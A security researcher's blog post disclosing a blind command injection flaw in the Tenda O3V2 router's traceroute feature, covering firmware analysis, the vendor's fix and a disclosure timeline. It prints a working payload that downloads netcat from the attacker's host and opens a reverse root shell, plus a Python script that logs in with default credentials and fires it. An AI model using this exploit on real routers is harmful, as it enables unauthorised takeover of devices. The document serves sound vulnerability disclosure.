---
title: Blind Command Injection in Tenda O3V2
date: 2024-05-01 13:00:00 +07:00
tags: [research, hardware]
---

Some time ago I had time to research router, the router I used for this research was a router that I hadn't used for a long time, namely Tenda O3V2. I used to use this router to connect to wifi over long distances (we call it "nembak wifi"). This Tenda O3 router actually has several versions, there are first version, second version, and third version, in this research I use the second version. The appearance of the Tenda O3V2 as shown below

![O3V2](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/O3.png)

In this research I found a blind command injection vulnerability in the traceroute feature. Blind command injection is a vulnerability that allows an attacker to execute operating system commands on the server that is running an application and application does not return the output from the command. So, Tenda O3V2 have diagnostic tool which includes traceroute but the ip address or domain input is not validated properly and allows the user to perform blind command injection. To perform blind command injection, the attacker needs admin access on the dashboard, but TendaO3V2 have default credential which is admin:admin, so if the user does not change the password then we can perform out blind command injection, and if the user has change password we still can bruteforce it until we got access in dashboard.

We need to retrieve the httpd binary from the router for disassembly and decompilation. There are two methods that can be used: first, by extracting the firmware (download from the official website, the vulnerable firmware version is v1.0.0.12), and second, by directly accessing it from the live or active router. When using the first method to extract the firmware, no filesystem is found in the firmware, i dont know why, possibly due to encryption, obfuscation, or packing in the firmware (my skill issue :( ). Then, when attempting the second method via UART, I failed to solder onto its three pins (RX, TX, and GND) resulting in burnt pin and the pin slightly peeled off (once again, my skill issue). Therefore, I enabled telnet through the dashboard (by default, telnet is disabled, and telnet credentials can be found on the internet) to gain shell access with root privileges. After obtaining shell access with root privileges, we can retrieve the httpd binary for analysis to identify vulnerabilities within it.

### Exploitation

Open router’s httpd binary with Ghidra. In the fromTraceroutGet function, there is a call to the FUN_004758f4 function, which contains a function for executing the traceroute command. Within the FUN_004758f4 function, there is the doSystemCmd function (used to perform traceroute), and this function requires user input. It is evident in the uVar5 variable in the fromTraceroutGet function that there is no sanitization; this variable will later be passed to the doSystemCmd function, potentially leading to command injection.

![fromtraceroutget Function](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/fromtraceroutget.png)

![fun_004758f4 Function](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/fun_004758f4.png)

Listen on port 1337 with nc (netcat), then activate the web server to make the router download the netcat binary (mips). Netcat is used for reverse shell.

![Python HTTP Server](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/pythonhttpserver.png)

Visit 192.168.2.1 then go to diagnose, select traceroute, and enter the IP.

![Diagnose](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/diagnose.png)

Intercept request when submit using burpsuite. In the getTraceroute endpoint, our IP is included in the destination parameter.

![Intercept Request](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/interceptrequest.png)

Change the value of the dest parameter to the command we want, for example performing a reverse shell<br>
```bash
;wget 192.168.2.158:8000/netcat -O /tmp/netcat&&chmod +x /tmp/netcat&&./tmp/netcat 192.168.2.158 1337 -e /bin/sh
```
Explanation of this command, the router will download the netcat binary stored in the tmp directory, then the binary will be given execute access and then execute the binary to reverse shell to port 1337. Then forward the request.

![Reverse Shell](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/revshell.png)

Check the web server, and it's visible that the router is downloading the netcat file.

![Download nc MIPS](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/downloadncmips.png)

Check on the listener, the reverse shell is successful. Now, we got full access to the router with root privilege.

![Got Root Shell](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/gotrootshell.png)

We can create a script to automate the process.


```python
import requests

username = "admin"
password = "YWRtaW4="
urllogin = "http://192.168.2.1/login/Auth"
logindata = {
    'username': username,
    'password': password,
    'timeZone': '12',
    'time': '2024;3;29;12;35;22'
}
command = "%3bwget+192.168.2.158:8000/netcat+-O+/tmp/netcat%26%26chmod+%2bx+/tmp/netcat%26%26./tmp/netcat+192.168.2.158+1337+-e+/bin/sh"

with requests.Session() as session:
        print("[Attempt Login]")
        session.post(urllogin, data=logindata)
        req = session.get(f"http://192.168.2.1/goform/getTraceroute?dest=1.1.1.1{command}&hop=1&_=1713166068405")
        print("[Got shell, Check your listener]")
```

### Mitigation

When this article was published, Tenda had already released new firmware for this device with firmware version 1.0.0.13(10751_5755). In this firmware version, the vulnerability has been fixed by implementing sanitization. Before entering the doSystemCmd function, user input will go through the is_valid_ip_or_domain function. If the input consists of numbers, it will return 1, then proceed to the doSystemCmd function, and the traceroute command will be executed.

![Sanitization](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/sanitization.png)

![is_valid_ip_or_domain Function](/assets/img/Blind-Command-Injection-in-Tenda-O3V2/is_valid_ip_or_domain.png)


They still haven't released the new firmware to the public but you can download the latest firmware [here](https://drive.google.com/file/d/1687UGmpNgmPnvOeJtIuDvoEUrDh7VSKZ/view?usp=sharing){:target="_blank"}{:rel="noopener noreferrer"}


### Timeline
25 March 2024: Vulnerability discovered and the initial contact inquired about Security Vulnerability Reporting to the vendor via email.<br>
28 March 2024: Vendor replied to directly contact to their email.<br>
29 March 2024: Sent them the details of the vulnerability discovered.<br>
30 March 2024: Vendor triage the vulnerability.<br>
7 April 2024: Vendor release new firmware version 1.0.0.13(10751_5755).<br>
8 April 2024: Retesting on the new firmware version and confirming the vulnerability has been fixed.